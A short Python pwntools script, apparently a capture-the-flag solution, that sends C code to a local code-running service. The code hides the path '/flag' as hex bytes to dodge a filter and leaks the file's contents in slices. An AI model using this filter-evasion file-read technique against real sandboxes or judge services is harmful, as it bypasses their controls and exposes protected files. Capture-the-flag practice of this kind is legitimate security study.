from pwn import *

context.log_level = "error"

payload = b'''#include <stdio.h>
int main(){char a[66];char b[]={0x2f,0x66,0x6c,0x61,0x67};FILE *c=fopen(b,"r");fgets(a,66,c);printf(a+ITER);}

'''
flag = b""
for i in range(1, 100, 10):
    io = remote("127.0.0.1", 8000)
    io.sendline(payload.replace(b"ITER", str(i).encode()))
    try:
        buf = io.recvuntil(b"[OUTPUT]\n")
        flag += io.recvline()[:-1] # remove newline
    except EOFError: break
    io.close()

print(f"Flag: P{flag.decode()}")